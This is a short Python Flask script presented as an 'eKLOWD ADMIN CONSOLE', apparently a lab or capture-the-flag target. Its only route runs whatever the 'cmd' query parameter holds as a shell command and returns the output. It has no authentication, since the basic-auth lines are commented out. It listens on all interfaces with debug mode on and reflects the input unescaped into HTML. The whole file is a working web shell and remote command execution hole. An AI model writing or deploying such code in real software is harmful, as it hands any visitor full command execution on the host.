from flask import Flask, render_template
from flask import request
import subprocess
app = Flask(__name__)

#app.config['BASIC_AUTH_USERNAME'] = '123'
#app.config['BASIC_AUTH_PASSWORD'] = '123'

#basic_auth = BasicAuth(app)

basehtml = '''
<head><title>eKLOWD ADMIN CONSOLE</title></head>
<body>
<h1>Hello, Admin. What command should I run?</h1>
<p>{cmd}</p>
<p>
<textarea rows="20" cols="60">{cmd_output}</textarea>
</p>
'''

@app.route("/")
def hello():
    try:
        cmd = request.args.get('cmd',)
        print("WTF is this? %s" % cmd)
        test = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
        output = test.communicate()[0].decode('ascii')
        return basehtml.format(cmd_output=output, cmd=cmd)
    except:
        print("FUCK Error")
        return basehtml.format(cmd_output="", cmd="NONE")

if __name__ == "__main__":
    app.run(debug=True,host='0.0.0.0')
    print("test pwn")
